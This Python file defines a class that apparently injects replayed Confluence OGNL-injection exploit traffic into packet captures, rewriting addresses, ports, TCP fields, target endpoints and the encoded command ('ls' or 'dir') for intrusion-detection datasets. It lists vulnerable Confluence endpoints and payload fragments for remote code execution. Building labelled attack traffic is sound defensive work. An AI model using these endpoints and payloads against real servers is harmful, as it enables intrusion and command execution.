import logging
import random as rnd

from scapy.all import *
import lea
import scapy.layers.inet as inet
import scapy.utils
import Attack.BaseAttack as BaseAttack
import Lib.Utility as Util
from Attack.Parameter import Parameter, Float, IPAddress, MACAddress, Port
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
load_layer("http")

class ConfluenceOGNLInjection(BaseAttack.BaseAttack):
    PORT_SOURCE = 'port.src'
    PORT_DESTINATION = 'port.dst'

    endpoint_variants = [
        "/pages/createpage-entervariables.action?SpaceKey=x",
        "/pages/doenterpagevariables.action",
        "/pages/createpage.action?spaceKey=myproj",
        "/users/user-dark-features",
        "/pages/templates2/viewpagetemplate.action",
        "/template/custom/content-editor",
        "/templates/editor-preload-container",
        "/pages/createpage-entervariables.action"
    ]

    #command for Windows and Linux
    os_cmd = ["dir", "ls"]
    template_attack_pcap_path = Util.RESOURCE_DIR + "Confluence_OGNL_Injection.pcap"

    """
    Creates a new instance of Confluence OGNL Injection attack.
    """
    def __init__(self):

        # Initialize attack
        super(ConfluenceOGNLInjection, self).__init__("ConfluenceOGNLInjection", "Injects a Confluence ONGL exploit'",
                                                 "Remote code execution")

        # Define allowed parameters
        self.update_params([
            Parameter(self.MAC_SOURCE, MACAddress()),
            Parameter(self.IP_SOURCE, IPAddress()),
            Parameter(self.PORT_SOURCE, Port()),
            Parameter(self.MAC_DESTINATION, MACAddress()),
            Parameter(self.IP_DESTINATION, IPAddress()),
            Parameter(self.PORT_DESTINATION, Port()),
            Parameter(self.PACKETS_PER_SECOND, Float())
        ])

    """
    Initialize a parameter with a default value specified in the specific attack
    :param param: parameter, which should be initialized
    :return: Boolean indicating success of initialization
    """
    def init_param(self, param: str) -> bool:
        value = None
        # Victim configuration
        if param == self.IP_DESTINATION:
            value = self.statistics.get_most_used_ip_address()
        elif param == self.MAC_DESTINATION:
            ip_dst = self.get_param_value(self.IP_DESTINATION)
            if not ip_dst:
                return False
            value = self.get_mac_address(ip_dst)
        # Attacker configuration
        elif param == self.IP_SOURCE:
            ip_dst = self.get_param_value(self.IP_DESTINATION)
            if not ip_dst:
                return False
            value = self.statistics.get_random_ip_address(ips=[ip_dst])
        elif param == self.MAC_SOURCE:
            ip_src = self.get_param_value(self.IP_SOURCE)
            if not ip_src:
                return False
            value = self.get_mac_address(ip_src)
        elif param == self.PORT_SOURCE:
            value = self.get_unique_random_ephemeral_port()
        elif param == self.PORT_DESTINATION:
            value = 80
        # Attack configuration
        elif param == self.PACKETS_PER_SECOND:
            value = self.statistics.get_most_used_pps()
        elif param == self.INJECT_AFTER_PACKET:
            value = rnd.randint(0, self.statistics.get_packet_count())
        if value is None:
            return False
        return self.add_param_value(param, value)

    """ 
    Creates the attack packets.
    """
    def generate_attack_packets(self):


        cmd = random.choice(self.os_cmd)
        endpoint = random.choice(self.endpoint_variants)

        # Timestamp
        timestamp_next_pkt = self.get_param_value(self.INJECT_AT_TIMESTAMP)

        # Initialize parameters
        mac_source = self.get_param_value(self.MAC_SOURCE)
        ip_source = self.get_param_value(self.IP_SOURCE)
        port_source = self.get_param_value(self.PORT_SOURCE)
        mac_destination = self.get_param_value(self.MAC_DESTINATION)
        ip_destination = self.get_param_value(self.IP_DESTINATION)
        port_destination = self.get_param_value(self.PORT_DESTINATION)

        self.ip_src_dst_catch_equal(ip_source, ip_destination)

        # Set TTL based on TTL distribution of IP address

        source_ttl_dist = self.statistics.get_ttl_distribution(ip_source)
        if len(source_ttl_dist) > 0:
            source_ttl_prob_dict = lea.Lea.fromValFreqsDict(source_ttl_dist)
            source_ttl_value = source_ttl_prob_dict.random()
        else:
            source_ttl_value = Util.handle_most_used_outputs(self.statistics.get_most_used_ttl_value())

        destination_ttl_dist = self.statistics.get_ttl_distribution(ip_destination)
        if len(destination_ttl_dist) > 0:
            destination_ttl_prob_dict = lea.Lea.fromValFreqsDict(destination_ttl_dist)
            destination_ttl_value = destination_ttl_prob_dict.random()
        else:
            destination_ttl_value = Util.handle_most_used_outputs(
                self.statistics.get_most_used_ttl_value())
        # Set Window Size based on Window Size distribution of IP address
        source_win_dist = self.statistics.get_win_distribution(ip_source)
        if len(source_win_dist) > 0:
            source_win_prob_dict = lea.Lea.fromValFreqsDict(source_win_dist)
        else:
            source_win_dist = self.statistics.get_win_distribution(self.statistics.get_most_used_ip_address())
            source_win_prob_dict = lea.Lea.fromValFreqsDict(source_win_dist)

        destination_win_dist = self.statistics.get_win_distribution(ip_destination)
        if len(destination_win_dist) > 0:
            destination_win_prob_dict = lea.Lea.fromValFreqsDict(destination_win_dist)
        else:
            destination_win_dist = self.statistics.get_win_distribution(self.statistics.get_most_used_ip_address())
            destination_win_prob_dict = lea.Lea.fromValFreqsDict(destination_win_dist)

        # Set MSS (Maximum Segment Size) based on MSS distribution of IP address
        mss_value = Util.handle_most_used_outputs(self.statistics.get_most_used_mss_value())
        if not mss_value:
            mss_value = 1465


        # Inject exploit pcap
        exploit_raw_packets = scapy.utils.RawPcapReader(self.template_attack_pcap_path)
        inter_arrival_times = self.get_inter_arrival_time(exploit_raw_packets)
        exploit_raw_packets.close()
        exploit_raw_packets = scapy.utils.RawPcapReader(self.template_attack_pcap_path)
        source_origin_wins, destination_origin_wins = {}, {}
        # Dictionary to store payload length difference for each conversation -> done to update the SEQ, ACK for when TCP payload is changed. 
        track_ephermal_ports_tcp_payload_diff = {}
        arrival_time = 0
        for self.pkt_num, pkt in enumerate(exploit_raw_packets):
            eth_frame = inet.Ether(pkt[0])
            ip_pkt = eth_frame.payload       
            tcp_pkt = ip_pkt.payload      
            http_pkt = tcp_pkt.payload
            arrival_time = arrival_time + inter_arrival_times[self.pkt_num]
            victim_ip = '172.17.0.3'
            # Request
            if ip_pkt.getfieldval("dst") == victim_ip:

                # New conversation: new destination port number
                if (tcp_pkt.getfieldval("ack") == 0 and self.pkt_num > 0):
                    port_source = self.get_unique_random_ephemeral_port()
                    port_destination = 80

                # Ether
                eth_frame.setfieldval("src", mac_source)
                eth_frame.setfieldval("dst", mac_destination)
                # IP
                ip_pkt.setfieldval("src", ip_source)
                ip_pkt.setfieldval("dst", ip_destination)
                ip_pkt.setfieldval("ttl", source_ttl_value)
                # TCP
                tcp_pkt.setfieldval("sport", port_source)
                tcp_pkt.setfieldval("dport", port_destination)
                # Window Size
                source_origin_win = tcp_pkt.getfieldval("window")
                if source_origin_win not in source_origin_wins:
                    while True:
                        source_win_rand_pick = source_win_prob_dict.random()
                        if source_win_rand_pick != 0:
                            break
                    source_origin_wins[source_origin_win] = source_win_rand_pick
                new_win = source_origin_wins[source_origin_win]
                tcp_pkt.setfieldval("window", new_win)
                # MSS
                tcp_options = tcp_pkt.getfieldval("options")
                if tcp_options:
                    if tcp_options[0][0] == "MSS":
                        tcp_options[0] = ("MSS", mss_value)
                        tcp_pkt.setfieldval("options", tcp_options)

                # Update packet details
                if tcp_pkt.getfieldval("sport") in track_ephermal_ports_tcp_payload_diff:
                    self.update_seq_ack(ip_pkt, track_ephermal_ports_tcp_payload_diff[tcp_pkt.getfieldval("sport")], True)
                else: 
                    track_ephermal_ports_tcp_payload_diff[tcp_pkt.getfieldval("sport")] = 0

                if http_pkt: 
                    # Update the payload with endpoint and comand - and track convo. 
                    track_ephermal_ports_tcp_payload_diff[tcp_pkt.getfieldval("sport")] = self.update_tcp_packet_payload(ip_pkt, endpoint, cmd)
                
                new_pkt = (eth_frame / ip_pkt / tcp_pkt)
                new_pkt.time = timestamp_next_pkt + arrival_time
                timestamp_next_pkt = self.timestamp_controller.next_timestamp()

            # Reply
            else:
                # Ether
                eth_frame.setfieldval("src", mac_destination)
                eth_frame.setfieldval("dst", mac_source)
                # IP
                ip_pkt.setfieldval("src", ip_destination)
                ip_pkt.setfieldval("dst", ip_source)
                ip_pkt.setfieldval("ttl", destination_ttl_value)
                # TCP
                tcp_pkt.setfieldval("dport", port_source)
                tcp_pkt.setfieldval("sport", port_destination)

                if tcp_pkt.getfieldval("dport") in track_ephermal_ports_tcp_payload_diff: 
                    self.update_seq_ack(ip_pkt, track_ephermal_ports_tcp_payload_diff[tcp_pkt.getfieldval("dport")], False)

                # Window Size
                destination_origin_win = tcp_pkt.getfieldval("window")
                if destination_origin_win not in destination_origin_wins:
                    while True:
                        destination_win_rand_pick = destination_win_prob_dict.random()
                        if destination_win_rand_pick != 0:
                            break
                    destination_origin_wins[destination_origin_win] = destination_win_rand_pick
                new_win = destination_origin_wins[destination_origin_win]
                tcp_pkt.setfieldval("window", new_win)
                # MSS
                tcp_options = tcp_pkt.getfieldval("options")
                if tcp_options:
                    if tcp_options[0][0] == "MSS":
                        tcp_options[0] = ("MSS", mss_value)
                        tcp_pkt.setfieldval("options", tcp_options)

                new_pkt = (eth_frame / ip_pkt / tcp_pkt)
                new_pkt.time = timestamp_next_pkt + arrival_time
                timestamp_next_pkt = self.timestamp_controller.next_timestamp()

            self.add_packet(new_pkt, ip_source, ip_destination)

        exploit_raw_packets.close()

    """
    Updates payload of TCP packet with a randomly generated endpoint and command.
    return: Difference in length for new TCP packet payload compared to original TCP packet payload
    """
    def update_tcp_packet_payload(self, ip_pkt, endpoint, cmd):
        current_endpoint = "/pages/createpage-entervariables.action?SpaceKey=x"
        current_cmd = "java.lang.String%28%5Cu0022id%5Cu0022%"
        http_pkt = ip_pkt.payload.payload
        original_payload = http_pkt[Raw].load.decode()
        updated_payload = original_payload.replace(current_endpoint, endpoint)
        http_pkt[Raw].load = updated_payload
        
        if cmd == 'ls':
            updated_payload = http_pkt[Raw].load.decode()
            if(current_cmd in updated_payload):
                updated_payload = updated_payload.replace(current_cmd, "java.lang.String%28%5Cu0022ls%5Cu0022%")
                http_pkt[Raw].load = updated_payload
        else:
            updated_payload = http_pkt[Raw].load.decode()
            if(current_cmd in updated_payload):
                updated_payload = updated_payload.replace(current_cmd, "java.lang.String%28%5Cu0022dir%5Cu0022%")
                http_pkt[Raw].load = updated_payload
            else:
                updated_payload = updated_payload.replace("java.lang.String%28%5Cu0022ls%5Cu0022%", "java.lang.String%28%5Cu0022dir%5Cu0022%")
                http_pkt[Raw].load = updated_payload

        tcp_payload_len_diff = len(updated_payload) - len(original_payload)
        # Recalculate the IP len as well as IP and TCP checksums if the payload length has changed
        if tcp_payload_len_diff != 0:
           self.update_ip_packet_len_and_checksums(ip_pkt)
        return tcp_payload_len_diff

    """
    Creates a pcap containing the attack packets.
    :return: The location of the generated pcap file.
    """
    def generate_attack_pcap(self):
        # Store timestamp of first packet (for attack label)
        self.attack_start_utime = self.packets[0].time
        self.attack_end_utime = self.packets[-1].time
        if len(self.packets) > 0:
            self.packets = sorted(self.packets, key=lambda pkt: pkt.time)
            self.path_attack_pcap = self.write_attack_pcap(self.packets, True, self.path_attack_pcap)
        # return self.packets sorted by packet time_sec_start
        # pkt_num+1: because pkt_num starts at 0
        return self.pkt_num + 1, self.path_attack_pcap